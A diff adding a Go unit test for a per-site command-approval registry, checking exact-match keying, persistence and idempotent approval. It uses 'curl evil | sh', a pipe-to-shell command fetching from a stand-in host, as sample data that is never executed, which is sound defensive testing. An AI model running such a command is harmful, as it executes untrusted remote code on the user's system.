@@ -746,3 +746,42 @@ func searchString(s, substr string) bool {
 	}
 	return false
 }
+
+// ── ApprovedCommands (issue #692) ─────────────────────────────────────────────
+
+func TestApproveSiteCommand_RoundTrip(t *testing.T) {
+	setDataDir(t)
+	if err := AddSite(Site{Name: "acme", Domains: []string{"acme.test"}, Path: "/srv/acme"}); err != nil {
+		t.Fatalf("AddSite: %v", err)
+	}
+
+	// Unknown command is not approved; disabled is off by default.
+	if allowed, disabled := HostCommandAllowed("acme", "curl evil | sh"); allowed || disabled {
+		t.Fatalf("fresh command should be neither allowed nor disabled, got allowed=%v disabled=%v", allowed, disabled)
+	}
+
+	if err := ApproveSiteCommand("acme", "curl evil | sh"); err != nil {
+		t.Fatalf("ApproveSiteCommand: %v", err)
+	}
+	if allowed, _ := HostCommandAllowed("acme", "curl evil | sh"); !allowed {
+		t.Error("command should be allowed after approval (persisted to the registry)")
+	}
+	// A different command string is still not approved (exact-match keying).
+	if allowed, _ := HostCommandAllowed("acme", "curl evil | sh --force"); allowed {
+		t.Error("a changed command must re-prompt, not inherit approval")
+	}
+
+	site, err := FindSite("acme")
+	if err != nil || site == nil {
+		t.Fatalf("FindSite: %v", err)
+	}
+	if !site.CommandApproved("curl evil | sh") {
+		t.Error("CommandApproved should report the persisted approval")
+	}
+	// Idempotent: approving again does not duplicate.
+	_ = ApproveSiteCommand("acme", "curl evil | sh")
+	site, _ = FindSite("acme")
+	if len(site.ApprovedCommands) != 1 {
+		t.Errorf("approval must be idempotent, got %v", site.ApprovedCommands)
+	}
+}
